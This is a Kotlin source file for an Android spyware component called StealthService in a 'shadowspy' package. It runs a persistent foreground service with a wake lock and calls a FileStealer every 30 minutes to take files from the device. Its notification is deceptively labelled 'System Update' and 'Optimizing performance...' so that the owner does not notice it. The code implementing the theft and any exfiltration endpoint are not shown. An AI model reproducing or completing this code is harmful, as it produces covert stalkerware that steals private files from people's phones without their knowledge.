package com.shadowspy

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log

class StealthService : Service() {

    private val TAG = "ShadowSpy_Service"
    private lateinit var fileStealer: FileStealer

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        fileStealer = FileStealer(this)
        createNotificationChannel()
        startForeground(1337, getNotification())
        Log.d(TAG, "StealthService started - File stealing enabled")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Ignore battery optimization
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowSpy::Wakelock")
        wl.acquire(10*60*1000L) // 10 min

        // Periodic file stealing
        Thread {
            while (true) {
                try {
                    fileStealer.scanAndStealFiles()
                    Thread.sleep(30 * 60 * 1000L) // every 30 min
                } catch (e: Exception) {
                    Log.e(TAG, "Error in steal loop", e)
                }
            }
        }.start()

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "shadowspy_channel",
                "ShadowSpy Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        return Notification.Builder(this, "shadowspy_channel")
            .setContentTitle("System Update")
            .setContentText("Optimizing performance...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }
}
